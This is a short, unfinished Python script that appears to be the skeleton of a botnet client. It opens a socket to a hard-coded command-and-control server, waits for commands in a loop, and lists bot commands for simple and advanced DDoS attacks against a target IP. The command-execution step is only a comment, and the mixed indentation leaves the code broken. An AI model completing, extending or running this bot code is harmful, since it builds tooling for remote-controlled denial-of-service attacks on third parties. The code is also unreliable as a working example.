# coding=utf-8

import sys
import os
import time 
import base64
import platform
import socket

import getpass
import hashlib
import requests
import thread
import json


def exec_command(command_string):
	bot_commands = {
		'Command_Bot.alive{"False"}' : '', 
		'Command_Bot.ddos{"192.168.0.1", 80}': 'Simple ddos',
    'Command_Bot.Addos{"192.168.0.1", 80, 5}': 'Advanced ddos'  
  }


def main():

  data_command = str('')
    
  connection_loop = bool(True)

  server_ip = str('192.168.0.7')
  server_port = int(9878)

  bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  bot_socket.connect((server_ip, server_port))
  
  while(connection_loop):

		data_command = bot_socket.recv(512)

		if(data_command != ''):
			#exec command
		
		else:
			pass





if __name__ == '__main__':
  main()